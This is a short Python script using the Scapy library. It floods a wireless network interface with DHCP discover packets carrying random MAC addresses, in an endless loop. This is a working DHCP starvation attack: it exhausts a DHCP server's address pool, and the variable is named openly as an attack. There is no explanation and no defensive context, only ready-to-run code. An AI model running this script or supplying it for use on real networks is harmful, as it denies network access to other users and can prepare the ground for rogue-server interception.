#!/usr/bin/env python3
from scapy.all import *

dhcp_attack = Ether(dst='ff:ff:ff:ff:ff:ff',src=RandMAC())  \
                     /IP(src='0.0.0.0',dst='255.255.255.255') \
                     /UDP(sport=68,dport=67) \
                     /BOOTP(op=1,chaddr = RandMAC()) \
                     /DHCP(options=[('message-type','discover'),('end')])

sendp(dhcp_attack,iface='wlan0',loop=1,verbose=1)
